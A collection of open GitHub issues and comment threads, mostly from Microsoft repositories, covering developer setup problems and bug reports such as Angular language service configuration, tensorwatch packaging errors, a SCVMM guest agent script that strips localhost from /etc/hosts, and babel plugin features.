<root>
  <Issue_0>
    <Repository>angular2-in-visual-studio</Repository>
    <Title>How to use features on existing Angular 2 .NET Core 2.0 app</Title>
    <Owner>microsoft</Owner>
    <Body>Upgraded to VS 15.5 this morning. I'd like to use these features on an existing Angular 2 app (based on the .NET Core 2.0 SPA template) but I can't tell how to enable them.</Body>
    <State>open</State>
    <Comment>
      <Owner>davidarivera</Owner>
      <Body>Same question. I don't see templates for ngml files, nor do I get the intellisense if I just rename an html file. How exactly is this new feature supposed to be accessed?</Body>
    </Comment>
    <Comment>
      <Owner>sireneweb</Owner>
      <Body>same problem, do i need to activate option in visual studio ?</Body>
    </Comment>
    <Comment>
      <Owner>mrxrow</Owner>
      <Body>not working after upgrade to VS 15.5. How to enable this features?</Body>
    </Comment>
    <Comment>
      <Owner>maxstee</Owner>
      <Body>With VS 15.5 it does not work even with this cloned repository</Body>
    </Comment>
    <Comment>
      <Owner>guillep2k</Owner>
      <Body>I've added:&#13;
```&#13;
"@angular/language-service": "^5.2.4",&#13;
```&#13;
to my package.json. I've matched the angular version I use, but at the time of this writing there's 5.2.5 of angular and only 5.2.4 of language-service (check github if in doubt).&#13;
&#13;
I've also added the following to my tsconfig.json (inside "compilerOptions"{}):&#13;
```&#13;
"plugins": [&#13;
 { "name": "@angular/language-service" }&#13;
],&#13;
"typeRoots": [&#13;
 "node_modules/@types"&#13;
],&#13;
&#13;
```&#13;
(I had some of the other settings from before, so I don't know which ones are relevant).&#13;
&#13;
Finally, I've changed my webpack.config.js from:&#13;
```&#13;
{ test: /\.html$/, use: 'html-loader?minimize=false' },&#13;
```&#13;
to:&#13;
```&#13;
{ test: /\.(html|ngml)$/, use: 'html-loader?minimize=false' },&#13;
```&#13;
Then I've cleaned my project, deleted the dist folders, closed and re-opened the solution. So far some of the goodies work fine; for example the @Component warnings and the inline template syntax check. But the ngml autocomplete does not, though. If I find a way to make it work, I'll post it here.</Body>
    </Comment>
    <Comment>
      <Owner>guillep2k</Owner>
      <Body>Update: the ngml autocomplete now works without me doing anything besides what I posted before. I guess it just needed a little time to gather all the relevant information.</Body>
    </Comment>
    <Comment>
      <Owner>kadamgreene</Owner>
      <Body>I've got Visual Studio 2017 15.5.7 and no language service plugins work.  I've tried following what people are saying here and still no intellisense of any type.</Body>
    </Comment>
  </Issue_0>
  <Issue_1>
    <Repository>app-center-app-react-native</Repository>
    <Title>Feature Survey: Add an app </Title>
    <Owner>microsoft</Owner>
    <Body>In the mobile center portal, users can add an app. As a frantic mobile developer, do you think we should add this feature into the mobile version? </Body>
    <State>open</State>
    <Comment>
      <Owner>jonrh</Owner>
      <Body>In general any "write/create" actions are not a priority in my opinion. For my own use case I would be perfectly content handling all that on the Mobile Center website. For the time being I think it's more important to focus on displaying results ("read") from Build, Test, Crashes and Analytics.&#13;
&#13;
Would love to hear other users perspective!</Body>
    </Comment>
    <Comment>
      <Owner>buptkang</Owner>
      <Body>@jonrh same perception as I initially think. Any further write (POST) in the app should be well considered.</Body>
    </Comment>
  </Issue_1>
  <Issue_2>
    <Repository>ApplicationInsights-statsd</Repository>
    <Title>publish Endpoint bug</Title>
    <Owner>microsoft</Owner>
    <Body>**Expect** : Publish statd data to application insight.&#13;
**Actual**: Failed to publish. &#13;
**Error**: The document is moved. The endpoint 'http' protocol it was publishing throwing a redirection response.&#13;
**_Change_** : upgrade the applicationinsights dependency to 0.17.2 which change the protocol to https.&#13;
The application endpoint doesn't accept http request and the fix was added with release 0.16.0.</Body>
    <State>open</State>
    <Comment>
      <Owner>deodeveloper</Owner>
      <Body>The failing part of the build looks like an environment issue and not related to the change proposed.</Body>
    </Comment>
  </Issue_2>
  <Issue_3>
    <Repository>PowerBI-visuals-TimelineStoryteller</Repository>
    <Title>JS Error: Cannot read property 'chartType' of undefined</Title>
    <Owner>microsoft</Owner>
    <Body>**JS Error Message:**&#13;
Cannot read property 'chartType' of undefined&#13;
&#13;
**Error Message:**&#13;
An error occurred while rendering the report.&#13;
&#13;
**Stack Trace:**&#13;
Microsoft.PowerBI.Client.Windows.JavaScriptException: An error occurred while rendering the report.&#13;
TypeError: Cannot read property 'chartType' of undefined&#13;
at Object.action (&lt;anonymous&gt;:56:29208)&#13;
at t.onOptionSelected (&lt;anonymous&gt;:45:14222)</Body>
    <State>open</State>
    <Comment>
      <Owner>stopyoukid</Owner>
      <Body>I don't see `onOptionSelected` or `chartType` anywhere in our code, nor in the published pbiviz js file.  Do you get this error when using TimelineStoryteller?</Body>
    </Comment>
  </Issue_3>
  <Issue_4>
    <Repository>project-java-spring-container</Repository>
    <Title>Updated spring to 2.0.5-RELEASE</Title>
    <Owner>microsoft</Owner>
    <Body>Updated spring to latest release</Body>
    <State>open</State>
    <Comment>
      <Owner>sachinma</Owner>
      <Body>This repo is no longer used. Please raise it in https://github.com/microsoft/devops-project-samples</Body>
    </Comment>
  </Issue_4>
  <Issue_5>
    <Repository>project-java-spring-webapp</Repository>
    <Title>Updated spring to 2.0.5-RELEASE</Title>
    <Owner>microsoft</Owner>
    <Body>Update spring to latest release `2.0.5-RELEASE`</Body>
    <State>open</State>
    <Comment>
      <Owner>sachinma</Owner>
      <Body>This repo is no longer used. Please raise it in https://github.com/microsoft/devops-project-samples</Body>
    </Comment>
  </Issue_5>
  <Issue_6>
    <Repository>project-php-laravel-container</Repository>
    <Title>Add the APPINSIGHTS_INSTRUMENTATIONKEY to .env.example</Title>
    <Owner>microsoft</Owner>
    <Body>Add the APPINSIGHTS_INSTRUMENTATIONKEY to .env.example</Body>
    <State>open</State>
    <Comment>
      <Owner>sachinma</Owner>
      <Body>This repo is no longer used. Please raise it in https://github.com/microsoft/devops-project-samples</Body>
    </Comment>
  </Issue_6>
  <Issue_7>
    <Repository>python-pykinect-pygame-cookiecutter</Repository>
    <Title>failed to download cookiecutter </Title>
    <Owner>microsoft</Owner>
    <Body>I can't download cookiecutter in vs2017  </Body>
    <State>open</State>
    <Comment>
      <Owner>zooba</Owner>
      <Body>@karandey7 Do you have Anaconda installed but not CPython? There was a known issue that you may have been hitting, but it has now been fixed.&#13;
&#13;
Try deleting your `C:\Users\&lt;you&gt;\AppData\Local\Microsoft\CookiecutterTools` and doing it again.&#13;
&#13;
Also feel free to report issues like these at https://github.com/Microsoft/PTVS, which is where we develop the Visual Studio integration for Python.</Body>
    </Comment>
  </Issue_7>
  <Issue_8>
    <Repository>RadialController</Repository>
    <Title>Turning of sleep mode</Title>
    <Owner>microsoft</Owner>
    <Body>The surface dial enters something like a sleep mode after some minutes and takes about 1-2 seconds to wake up again. Is there a way to turn that off?</Body>
    <State>open</State>
    <Comment>
      <Owner>SaveTheHuman5</Owner>
      <Body>Fu**!! is the only think I can said.&#13;
This sleep issue just make the surface dial non usable!!&#13;
&#13;
There is no fix for this?</Body>
    </Comment>
  </Issue_8>
  <Issue_9>
    <Repository>real-time-blend-demo</Repository>
    <Title>how to capture images </Title>
    <Owner>microsoft</Owner>
    <Body>how to capture images please do reply
</Body>
    <State>open</State>
    <Comment>
      <Owner>hamishwillee</Owner>
      <Body>Hi Adi

There are numerous examples of how to capture images, but this is probably not the right place to ask the question. I suggest you check out all the examples in the Lumia Developer Library, and if you still can't work out how to do it then ask here: http://developer.nokia.com/community/discussion/forumdisplay.php/326-Windows-Phone-Imaging
</Body>
    </Comment>
  </Issue_9>
  <Issue_10>
    <Repository>SCVMMLinuxGuestAgent</Repository>
    <Title>cfghostdomain wrecks hosts file if hostname is already set to localhost</Title>
    <Owner>microsoft</Owner>
    <Body>If the hostname is set to "localhost", sysctl kernel.hostname returns localhost. The subsequent sed/echo operation proceeds to destroy the /etc/hosts file when it tries to write the hostname and address to it.</Body>
    <State>open</State>
    <Comment>
      <Owner>shanselman</Owner>
      <Body>Checking on this. </Body>
    </Comment>
    <Comment>
      <Owner>chrisjsmith</Owner>
      <Body>How did the checking go?</Body>
    </Comment>
    <Comment>
      <Owner>saipv</Owner>
      <Body>Thank you @shanselman for redirecting the issue to us.&#13;
Hello @chrisjsmith , I am the PM from the team who currently owns this code. Sorry for the delay on this. Please give us some time to diagnose. We will reply here at the very earliest with the repro details and any further environment info we may need from you. Thanks for understanding. </Body>
    </Comment>
    <Comment>
      <Owner>chrisjsmith</Owner>
      <Body>Thanks for this. Much appreciated!</Body>
    </Comment>
    <Comment>
      <Owner>deepgu</Owner>
      <Body>I tried this scenario when host name is already set to localhost but it did not destroy /etc/hosts file. It only removed older hostname from /etc/hosts file.&#13;
&#13;
@chrisjsmith, Can you share the agent version or actual cfghostdomain file from your environment.</Body>
    </Comment>
    <Comment>
      <Owner>chrisjsmith</Owner>
      <Body>I've referred this to an internal team member who has been directly dealing with this. He will post a reply shortly.</Body>
    </Comment>
    <Comment>
      <Owner>Tadas</Owner>
      <Body>Here output from a fresh scvmm.log:&#13;
```&#13;
[root@test-localhost ~]# cat /var/opt/microsoft/scvmmguestagent/log/scvmm.log | grep version&#13;
2017-10-25T10:15:50,991Z Info       [scx.vmmguestagent.osconfigurator.commandexecutor:163:1154:140046290233216] stdout as a result of running command:10/25/17 10:15:50 UTC?Current version: 1.0.2.1075??10/25/17 10:15:50 UTC?Current agent version is the latest.?? (* Message contained unprintable (?) characters *)&#13;
2017-10-25T10:15:50,991Z Info       [scx.vmmguestagent.src.fetcher.isofetcher:428:1154:140046290233216] No upgrade was required - its the same version&#13;
2017-10-25T10:16:39,766Z Info       [scx.vmmguestagent.osconfigurator.commandexecutor:163:891:139693392934784] stdout as a result of running command:10/25/17 10:16:38 UTC?Current version: 1.0.2.1075??10/25/17 10:16:38 UTC?Current agent version is the latest.?? (* Message contained unprintable (?) characters *)&#13;
2017-10-25T10:16:39,766Z Info       [scx.vmmguestagent.src.fetcher.isofetcher:428:891:139693392934784] No upgrade was required - its the same version&#13;
[root@test-localhost ~]#&#13;
```&#13;
Notice the version is the same as this repo: 1.0.2.1075.&#13;
&#13;
Just to clarify, by "destroy" my colleague means that localhost entries are removed from `/etc/hosts` and I believe this is the cause:&#13;
https://github.com/Microsoft/SCVMMLinuxGuestAgent/blob/d95bd437be488fa7f7407acf6e9f653a523c6d97/vmm/dev/scripts/cfghostdomain#L74-L78&#13;
&#13;
If the hostname is localhost, then sed removes any lines that contain "localhost". I believe it should never be removed because without it the client is querying DNS servers to resolve `localhost`, which seems odd and unnecessary.&#13;
</Body>
    </Comment>
    <Comment>
      <Owner>chrisjsmith</Owner>
      <Body>Anyone at MSFT care to comment?</Body>
    </Comment>
    <Comment>
      <Owner>saipv</Owner>
      <Body>Hello @chrisjsmith , can you please let us know the reason behind leaving the hostname as "Localhost" for a template VM? When VMM tries specializing the VM from this VHD/X, the agent removes the old hostname on the disk.</Body>
    </Comment>
    <Comment>
      <Owner>chrisjsmith</Owner>
      <Body>That's pretty irrelevant to the problem. The default unqualified hostname when systemd is started is "localhost". The machine is entirely free of identity at this point. That's a standard configuration, at least across all non MSFT deployment platforms (spacewalk/cloud-init etc) where this works flawlessly.  It doesn't have to have an explicitly defined hostname.&#13;
&#13;
Not only that you don't actually need to set the hostname in /etc/hosts. /etc/nsswitch.conf will allow resolution of the machine name/IP across the POSIX API and show the resolver results without an entry in hosts. So for example you can do:&#13;
&#13;
```&#13;
# hostname&#13;
localhost&#13;
# set-hostname super-monkey-ball&#13;
# hostname&#13;
super-monkey-ball&#13;
# getent hosts super-monkey-ball&#13;
fe80::89d3:5cfb:d39:cf9f super-monkey-ball&#13;
```&#13;
&#13;
Perhaps you guys should support cloud-init instead of reinventing a wheel. This has distribution awareness and is better maintained and far better documented than your approach: http://cloudinit.readthedocs.io/en/latest/</Body>
    </Comment>
    <Comment>
      <Owner>Tadas</Owner>
      <Body>Hi, @saipv ! Thanks for looking into this. Basically, the reason for leaving the hostname as "localhost" is because there is no SCVMM documentation saying that one shouldn't and that's what the CentOS install process leaves us with.</Body>
    </Comment>
  </Issue_10>
  <Issue_11>
    <Repository>tensorwatch</Repository>
    <Title>pip package missing json file</Title>
    <Owner>microsoft</Owner>
    <Body>I try to execute following cnn_pred_explain notebook on Colab.&#13;
 https://github.com/microsoft/tensorwatch/blob/master/notebooks/cnn_pred_explain.ipynb&#13;
&#13;
But I failed to execute it, because following error appeared.&#13;
&#13;
```&#13;
---------------------------------------------------------------------------&#13;
FileNotFoundError                         Traceback (most recent call last)&#13;
&lt;ipython-input-5-b08090dd95a6&gt; in &lt;module&gt;()&#13;
     10 image_utils.show_image(img)&#13;
     11 probabilities = imagenet_utils.predict(model=model, images=[img])&#13;
---&gt; 12 imagenet_utils.probabilities2classes(probabilities, topk=5)&#13;
     13 input_tensor = imagenet_utils.image2batch(img)&#13;
     14 prediction_tensor = pytorch_utils.int2tensor(239)&#13;
&#13;
2 frames&#13;
/usr/local/lib/python3.6/dist-packages/tensorwatch/imagenet_utils.py in __init__(self, json_path)&#13;
     54         json_path = json_path or os.path.join(os.path.dirname(__file__), 'imagenet_class_index.json')&#13;
     55 &#13;
---&gt; 56         with open(os.path.abspath(json_path), "r") as read_file:&#13;
     57             class_json = json.load(read_file)&#13;
     58             self._idx2label = [class_json[str(k)][1] for k in range(len(class_json))]&#13;
&#13;
FileNotFoundError: [Errno 2] No such file or directory: '/usr/local/lib/python3.6/dist-packages/tensorwatch/imagenet_class_index.json'&#13;
```&#13;
In my guess, python pip package misses json file inclusion.&#13;
&#13;
Reference&#13;
  A Simple Guide for Python Packaging&#13;
 https://medium.com/small-things-about-python/lets-talk-about-python-packaging-6d84b81f1bb5&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sakaia</Owner>
      <Body>On Colab, I execute following script. image_data should be include on python package.&#13;
Then following git clone command will be removed.&#13;
&#13;
```&#13;
!pip install tensorwatch&#13;
!pip install lime&#13;
!git clone http://github.com/microsoft/tensorwatch&#13;
!cp -r tensorwatch/data ..&#13;
%matplotlib inline&#13;
from tensorwatch.saliency import saliency&#13;
from tensorwatch import image_utils, imagenet_utils, pytorch_utils&#13;
model = pytorch_utils.get_model('resnet50')&#13;
img = image_utils.open_image('../data/test_images/dogs.png', convert_mode='RGB')&#13;
image_utils.show_image(img)&#13;
probabilities = imagenet_utils.predict(model=model, images=[img])&#13;
imagenet_utils.probabilities2classes(probabilities, topk=5)&#13;
input_tensor = imagenet_utils.image2batch(img)&#13;
prediction_tensor = pytorch_utils.int2tensor(239)&#13;
results = saliency.get_image_saliency_results(model, img, input_tensor, prediction_tensor)&#13;
figure = saliency.get_image_saliency_plot(results)&#13;
```&#13;
</Body>
    </Comment>
  </Issue_11>
  <Issue_12>
    <Repository>tensorwatch</Repository>
    <Title>Integration with other libraries (TensorFlow, PyTorch etc)</Title>
    <Owner>microsoft</Owner>
    <Body>Kudos to the team for this great library. I was wondering if it is possible to integrate `tensorwatch` with other libraries as mentioned. I am asking this out of my curiosity derived while using `interpret` as it allows for crazy integrations. &#13;
&#13;
Any example/hint would be great so that I can prepare a notebook and share. </Body>
    <State>open</State>
    <Comment>
      <Owner>sytelus</Owner>
      <Body>Thank you! TensorWatch currently works well with PyTorch and it should work well with TensorFlow eager mode tensors. We are still working on Keras integration however. BTW, do you mean [this library](https://github.com/Microsoft/interpret) when you mention `interpret`? If you are looking for any specific integrations, we would love to know as well!</Body>
    </Comment>
    <Comment>
      <Owner>sayakpaul</Owner>
      <Body>Yes, I mean that library. &#13;
&#13;
&gt; TensorWatch currently works well with PyTorch and it should work well with TensorFlow eager mode tensors.&#13;
&#13;
Examples would be great. &#13;
&#13;
Also, since `keras` has been merged into `TensorFlow` (from its 1.13 release) I think that advantage can be taken. For example, I used `interpret` to generate explanations from a model created using  `keras` from the `tensorflow` variant by wrapping it into a sklearn compatible version (see [this notebook](https://github.com/sayakpaul/Benchmarking-and-MLI-experiments-on-the-Adult-dataset/blob/master/TF%202.0%20%2B%20interpret.ipynb)). </Body>
    </Comment>
  </Issue_12>
  <Issue_13>
    <Repository>tensorwatch</Repository>
    <Title> Could not find a version that satisfies the requirement torchstat</Title>
    <Owner>microsoft</Owner>
    <Body>ERROR: Could not find a version that satisfies the requirement torchstat (from tensorwatch) (from versions: none)&#13;
ERROR: No matching distribution found for torchstat (from tensorwatch)&#13;
&#13;
My Env: &#13;
&#13;
python   3.7.3&#13;
torchvision   0.3.0&#13;
torch 1.1.0</Body>
    <State>open</State>
    <Comment>
      <Owner>sytelus</Owner>
      <Body>That's surprising. Could you please try running:&#13;
&#13;
```&#13;
pip install torchstat&#13;
```&#13;
&#13;
Also, do you have pandas installed? Are you using Anaconda?</Body>
    </Comment>
  </Issue_13>
  <Issue_14>
    <Repository>tensorwatch</Repository>
    <Title>Need to support AdaptiveAvgPool2d for ResNet</Title>
    <Owner>microsoft</Owner>
    <Body>When I run on TensorWatch on Google Colab, Following messages are appeared.&#13;
&#13;
```&#13;
[MAdd]: AdaptiveAvgPool2d is not supported!&#13;
[Flops]: AdaptiveAvgPool2d is not supported!&#13;
[Memory]: AdaptiveAvgPool2d is not supported!&#13;
```&#13;
Test Code is follows&#13;
```&#13;
!pip install tensorwatch&#13;
&#13;
import tensorwatch as tw&#13;
import torchvision.models&#13;
&#13;
resnet_model = torchvision.models.resnet50()&#13;
tw.model_stats(resnet_model, [1, 3, 224, 224])&#13;
```</Body>
    <State>open</State>
    <Comment>
      <Owner>sytelus</Owner>
      <Body>This is currently expected because TensorWatch uses another library called torchstat underneath which does not support AdaptiveAvgPool2d layers for computing Flops and Memory. We are looking in to enhancing torchstat but for now you will get flops which are bit less than actual values when model uses above layer.</Body>
    </Comment>
  </Issue_14>
  <Issue_15>
    <Repository>tensorwatch</Repository>
    <Title>Provide script files for notebooks?</Title>
    <Owner>microsoft</Owner>
    <Body>Thank you! This project will help a lot of people in their research.&#13;
&#13;
Looking at [notebooks/mnist.ipynb](https://github.com/microsoft/tensorwatch/blob/master/notebooks/mnist.ipynb), how are inputs expected, specifically for the topk visualisations?&#13;
&#13;
I want to understand the block:&#13;
```python&#13;
rand_pred = train.create_stream(expr="topk_all(l, \&#13;
            batch_vals=lambda b: (b.batch.loss_all, (b.batch.input, b.batch.output), b.batch.target), \&#13;
            out_f=image_class_outf, order='rnd')", event_name='batch', throttle=2)&#13;
```&#13;
The tutorials specify using a lambda expression, where `b` contains the watcher observed arguments. I'm not sure how to use `topk_all` and where `l` comes from.&#13;
&#13;
Would it possible to see the training scripts for the notebooks provided in the repository?&#13;
&#13;
</Body>
    <State>open</State>
    <Comment>
      <Owner>sytelus</Owner>
      <Body>Thanks for pointing this out. We will add the script and docs for this notebook and update this issue soon!</Body>
    </Comment>
  </Issue_15>
  <Issue_16>
    <Repository>tensorwatch</Repository>
    <Title>pip install tensorwatch: missing ipywidgets and sklearn</Title>
    <Owner>microsoft</Owner>
    <Body>After doing "pip install tensorwatch", I tried to run "sum_log.py".  It required me to manually pip install "ipywidgets" and "sklearn" - these should be included tensorwatch's setup.py dependencies.</Body>
    <State>open</State>
    <Comment>
      <Owner>sytelus</Owner>
      <Body>Thanks for trying this out! I thought those would be included as part of Anaconda distribution. I've added these dependencies and updated PyPi package.</Body>
    </Comment>
    <Comment>
      <Owner>rfernand2</Owner>
      <Body>Cool &#8211; thanks!&#13;
&#13;
</Body>
    </Comment>
  </Issue_16>
  <Issue_17>
    <Repository>tracks</Repository>
    <Title>SensorCore SDK in Windows 10</Title>
    <Owner>microsoft</Owner>
    <Body>Is there anyone responsible for SensorCore SDK? I'd like to reqrite my app for Windows 10, but there is no information about how to use SensorCore SDK in W10 (mobile).
</Body>
    <State>open</State>
    <Comment>
      <Owner>agorby</Owner>
      <Body>steelspace, I think it is sample how to use in Windows 10 https://github.com/Microsoft/steps</Body>
    </Comment>
  </Issue_17>
  <Issue_18>
    <Repository>ZooTracer</Repository>
    <Title>Cannot download Opencv 2.4.8 </Title>
    <Owner>microsoft</Owner>
    <Body>Hi, &#13;
&#13;
This Zootracer requries the opencv 2.4.8 which is not available from the Opencv Project. The most similar one is Opencv 2.4.9. However the three ".dll" files doesn't work if I copy the files from 2.4.9 and rename them to 2.4.8.&#13;
&#13;
Can anyone upload these files to this repository? Thanks!</Body>
    <State>open</State>
    <Comment>
      <Owner>neslihanedes</Owner>
      <Body>I have the same issue, any update for this issue?</Body>
    </Comment>
  </Issue_18>
  <Issue_19>
    <Repository>passon</Repository>
    <Title>Migration needed to latest version of mobile-angular-ui </Title>
    <Owner>jryu01</Owner>
    <Body>Current code depends on older version of the mobile angular ui library. 
Needs to be migrated into new version.
http://mobileangularui.com/
</Body>
    <State>open</State>
    <Comment>
      <Owner>jryu01</Owner>
      <Body>Or perhaps, ditching the mobile-angular-ui which is not mature and switching to bootstrap's ratchet(only css though) might be better option. 
http://goratchet.com/
</Body>
    </Comment>
  </Issue_19>
  <Issue_20>
    <Repository>Logitech-BCC950-PTZ-Lib</Repository>
    <Title>Tilt does not work without intervention</Title>
    <Owner>shanselman</Owner>
    <Body>I have the following code:

```
PTZDevice device = PTZDevice.GetDevice("BCC950 ConferenceCam", PTZType.Relative);
device.Move(0,1);
```

If used in the following scenario, it works:
1. Camera is plugged in to computer.
2. I press one of the tilt buttons on the device
3. Application is started
4. Camera tilts

However, the following scenario does not work:
1. Camera is plugged in to computer
2. Application is started
3. Camera does not tilt

The same does not apply for panning, i.e device.Move(1,0) works flawlessly.

Don't know if I'm missing something substantial, but it would be interesting to know how to solve the problem.
// M&#229;ns
</Body>
    <State>open</State>
    <Comment>
      <Owner>shanselman</Owner>
      <Body>Seems like a hardware thing. I'm not seeing this. 

On Nov 11, 2013, at 5:49 AM, M&#229;ns Andersson notifications@github.com wrote:

I have the following code:

PTZDevice device = PTZDevice.GetDevice("BCC950 ConferenceCam", PTZType.Relative);
device.Move(0,1);
If used in the following scenario, it works:
1. Camera is plugged in to computer.
2. I press one of the tilt buttons on the device
3. Application is started
4. Camera tilts

However, the following scenario does not work:
1. Camera is plugged in to computer
2. Application is started
3. Camera does not tilt

Don't know if I'm missing something substantial, but it would be interesting to know how to solve the problem.
// M&#229;ns

&#8212;
Reply to this email directly or view it on GitHub.
</Body>
    </Comment>
    <Comment>
      <Owner>freefl</Owner>
      <Body>I got exactly same issue here and it happened on several PCs too.
</Body>
    </Comment>
    <Comment>
      <Owner>zhengshengliang</Owner>
      <Body>-,-!    pls help me,,,,,i am meeting a problem same as mansandersson and it annoyed me for several weeks.Of course i used Logitech BCC950 cam whice pan and zoom function works well but titl doesn't work at all.............but what makes it strange is that cameral can tilt well when i press the titl button on the logitech device........................PTZDevice and DirectShow2005 was used...........what makes this problem,,,,thanks for u help.....
</Body>
    </Comment>
    <Comment>
      <Owner>maunilgajjar</Owner>
      <Body>I found a solution for this, there is a sleep time defined in the PTZDevice.cs file which is the source file for PTZDevice.dll. The sleep time is defined as 20, change it to anything above 50 and it will work.&#13;
&#13;
![image](https://cloud.githubusercontent.com/assets/25502867/22545293/1c8d8d52-e95e-11e6-8a17-5de75e87fd11.png)&#13;
</Body>
    </Comment>
  </Issue_20>
  <Issue_21>
    <Repository>spring-spock-mock-beans-demo</Repository>
    <Title>When jpa involved, spock stub will not work.</Title>
    <Owner>kiview</Owner>
    <Body>The demo works by itself, but if you add spring-boot-starter-data-jpa dependency, the test will break. &#13;
Seems jpa try to use cglib generate proxy for class annotated with @Repository and ignore the proxy generated by spock stub, more specifically, the CglibMockInterceptorAdapter interceptor get lost.&#13;
&#13;
For now, I use a workaround, by adding a copy of BookRepository under test directory, and annotated with &#13;
@Component and @Profile("mock"), and run the test with "mock" profile. The idea is make sure no @Repostory annotation used, so jpa will not mess up the previous config.&#13;
&#13;
Tried to leave a comment on the blog, but can't open the comment section, error looks like,disqus.js?ver=4.6.1:55 GET http://groovy-coder.disqus.com/embed.js net::ERR_CONNECTION_TIMED_OUT&#13;
&#13;
P.S. Great blog, looking forward to new ones.&#13;
P.S.S I am a Chinese developer, pardon me for my broken English.</Body>
    <State>open</State>
    <Comment>
      <Owner>kiview</Owner>
      <Body>Thanks for your feedback. I'll check out your aproach and write a follow up with a better working solution.</Body>
    </Comment>
  </Issue_21>
  <Issue_22>
    <Repository>arrow</Repository>
    <Title>ARROW-1976: [Python] PR Feedback for Fix Pandas data SerDe with Unicode column names in Python 2.7</Title>
    <Owner>Licht-T</Owner>
    <Body>This PR applies the changes from the feedback in this PR: https://github.com/apache/arrow/pull/1476&#13;
&#13;
Thanks again @Licht-T for your work on this issue. If my changes are ok with you, you can merge this PR into your already existing one.</Body>
    <State>open</State>
    <Comment>
      <Owner>xhochy</Owner>
      <Body>@simnyatsanga Can you make this PR directly against Arrow master? Then we could merge it directly.</Body>
    </Comment>
  </Issue_22>
  <Issue_23>
    <Repository>awesome-python-modules</Repository>
    <Title>Sorting the list of awesome-python-modules</Title>
    <Owner>gauravssnl</Owner>
    <Body>Sorting the list of awesome-python-modules with their different categories would make it an ease to browse through.</Body>
    <State>open</State>
    <Comment>
      <Owner>gauravssnl</Owner>
      <Body>Yes, categorization will make browsing easier, but a lot of time is required to do that . Another reason is that categorization is not an easy task . For example, some of the modules may be related to several categories.&#13;
I made this repository from my Facebook notes where I just stored GitHub repository URL &amp; details , but no categories. The number of repository links are large.</Body>
    </Comment>
  </Issue_23>
  <Issue_24>
    <Repository>MonoRun</Repository>
    <Title>Please install mono on your system</Title>
    <Owner>six519</Owner>
    <Body>Mono is installed on my system but getting this error.
I'm using Mavericks OS X
</Body>
    <State>open</State>
    <Comment>
      <Owner>Pils19</Owner>
      <Body>Hey i have the same issue as well on OS X :(

Traceback (most recent call last):
  File "Mono in /Users/lukasbiermann/Library/Application Support/Sublime Text 3/Installed Packages/MonoRun.sublime-package", line 114, in &lt;lambda&gt;
  File "Mono in /Users/lukasbiermann/Library/Application Support/Sublime Text 3/Installed Packages/MonoRun.sublime-package", line 142, in monoRunCallback
  File "base3 in /Users/lukasbiermann/Library/Application Support/Sublime Text 3/Installed Packages/MonoRun.sublime-package", line 9, in printMessage
FileNotFoundError: [Errno 2] No such file or directory: '/Users/lukasbiermann/Library/Application Support/Sublime Text 3/Packages//MonoRun/ascii'
</Body>
    </Comment>
  </Issue_24>
  <Issue_25>
    <Repository>lax</Repository>
    <Title>Update code to function in python3 as well as python2</Title>
    <Owner>iogf</Owner>
    <Body>I was interested in this project, but I'm using python3, so I decided to convert the code to work with python3.  It should still work with python2 (tested with 2.7.15).</Body>
    <State>open</State>
    <Comment>
      <Owner>iogf</Owner>
      <Body>I plan to abandon python2 support for this project. If you feel likely submitting a pull request for that i would appreciate very much.</Body>
    </Comment>
  </Issue_25>
  <Issue_26>
    <Repository>fp-msgpack</Repository>
    <Title>compatible  with delphi </Title>
    <Owner>ik5</Owner>
    <Body>hi , thank you for your great project, one small question, is the project compatible with Delphi?
</Body>
    <State>open</State>
    <Comment>
      <Owner>ik5</Owner>
      <Body>Hi,

In theory it does, but require few tweaks for that, but I do not own Delphi copy to test it on.

There is also the following project: https://github.com/arthurprs/msgpack-delphi
It support Delphi, but require a lot of work to support FPC.

If you are willing to test are report issues with Delphi, then I hope it will be doable as well.
</Body>
    </Comment>
    <Comment>
      <Owner>qindj</Owner>
      <Body>Hi, Thank you for your reply.
I tried to find a component of msgpack for both fpc and delphi.
I checked out msgpack-delphi from github , but the demos can not work, and seems not active.

I'll try your project and report issues later, thank you again!

At 2012-11-03 17:45:07,ik notifications@github.com wrote:

Hi,

In theory it does, but require few tweaks for that, but I do not own Delphi copy to test it on.

There is also the following project: https://github.com/arthurprs/msgpack-delphi
It support Delphi, but require a lot of work to support FPC.

If you are willing to test are report issues with Delphi, then I hope it will be doable as well.

&#8212;
Reply to this email directly or view it on GitHub.
</Body>
    </Comment>
  </Issue_26>
  <Issue_27>
    <Repository>babel-plugin-annotate-console-log</Repository>
    <Title>Not working with async functions; using asyncToGenerator</Title>
    <Owner>gajus</Owner>
    <Body>I'm using `stage-0` preset which converts async functions to generator functions like this:&#13;
&#13;
```js&#13;
async function foo () {&#13;
  console.log('even?')&#13;
}&#13;
```&#13;
```js&#13;
let foo = (() =&gt; {&#13;
  var _ref = _asyncToGenerator(function* () {&#13;
    console.log('even?');&#13;
  });&#13;
&#13;
  return function foo() {&#13;
    return _ref.apply(this, arguments);&#13;
  };&#13;
})();&#13;
```&#13;
`console.log` gets encapsulated in anonymous functions preventing `annotate-console-log` to do its thing.&#13;
&#13;
Should it look for a couple parents up? `let foo = (...)`</Body>
    <State>open</State>
    <Comment>
      <Owner>laggingreflex</Owner>
      <Body>Although it might not work in case of default exports:&#13;
```js&#13;
export default async function foo () {&#13;
  console.log('even?')&#13;
}&#13;
```&#13;
```js&#13;
exports.default = (() =&gt; {&#13;
  var _ref = _asyncToGenerator(function* () {&#13;
    console.log('even?');&#13;
  });&#13;
&#13;
  function foo() {&#13;
    return _ref.apply(this, arguments);&#13;
  }&#13;
&#13;
  return foo;&#13;
})();&#13;
```&#13;
it might incorrectly label it as "default"</Body>
    </Comment>
  </Issue_27>
  <Issue_28>
    <Repository>babel-plugin-annotate-console-log</Repository>
    <Title>add script path</Title>
    <Owner>gajus</Owner>
    <Body>If you specify option `"scriptPath": true`:&#13;
```js&#13;
"plugins": [&#13;
  ["annotate-console-log", {&#13;
    "scriptPath": true&#13;
  }]&#13;
]&#13;
```&#13;
it'll add a short script path (and line number)&#13;
```js&#13;
console.log('hi')&#13;
// =&gt;&#13;
console.log('[file.js:3]', 'foo()', 'hi')&#13;
```&#13;
If the filename was `index.js` it'll ad the parent foldername&#13;
```js&#13;
console.log('[foo/index.js:5]', 'foo()', 'hi')&#13;
```&#13;
&#13;
Use `"fullScriptPath": true` to add more detailed script path info&#13;
```js&#13;
console.log('foo()', 'hi', {&#13;
  scriptColumn: 4,&#13;
  scriptLine: 9,&#13;
  scriptPath: 'relative/to/nearest/package.json/full-script-path/index.js'&#13;
})&#13;
```&#13;
